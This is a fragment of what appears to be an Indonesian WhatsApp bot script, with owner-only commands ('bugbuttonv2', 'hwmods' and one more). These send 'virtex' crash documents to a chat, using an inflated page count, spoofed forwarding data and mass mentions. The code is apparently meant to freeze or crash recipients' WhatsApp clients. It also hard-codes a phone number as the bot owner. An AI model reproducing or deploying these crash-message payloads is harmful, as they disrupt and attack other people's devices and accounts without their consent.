...
ownerNumbers = ["","6289654489730@s.whatsapp.net","6289654489730@s.whatsapp.net"]
linkcom = ".com" // 6289654489730@s.whatsapp.netAnti Link ( HW MODS WA )
...
case 'bugbuttonv2':
if (!kal.key.fromMe) return fakestatus('APASIH')
      ptod = "6289654489730@s.whatsapp.net"
        stod = `${sender}`
        otod = `Putra Kelana`
        uwu = '```'
       stst = await Haikal.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
tescok = `〽️ PUTRA々KELANA 〽️`
Sendbutdocument(from, tescok, `💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞`, fs.readFileSync('./virtex/butt.pdf'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./logo.jpeg'), filename:`${jadivirtex1}.pdf`, pageCount: 9999999 }, [{buttonId:`!000`,buttonText:{buttonId:`${prefix}id10`,displayText: `putrα々kєlαnα`},type:1}], {quoted: !kal, contextInfo: { mentionedJid: [ptod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`YT: 〽️ PUTRA々KELANA 〽️`,mediaType:"2",thumbnail: thumb, mediaUrl:`https://youtube.com/channel/UCSpYxXxRuGOfezlWd1S7Amw`}}})
break
case 'hwmods':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
...
if (!kal.key.fromMe) return fakestatus('APASIH')
             ini_image = fs.readFileSync('./stik/fake.jpeg')             
             anu = fs.readFileSync('./stik/numayei.mp3')
             Haikal.sendMessage(from, anu, document, { quoted: ikal, mimetype: Mimetype.pdf, filename: `PUTRA KELANA${ngazap(prefix)}.pdf`, thumbnail: ini_image })
             break
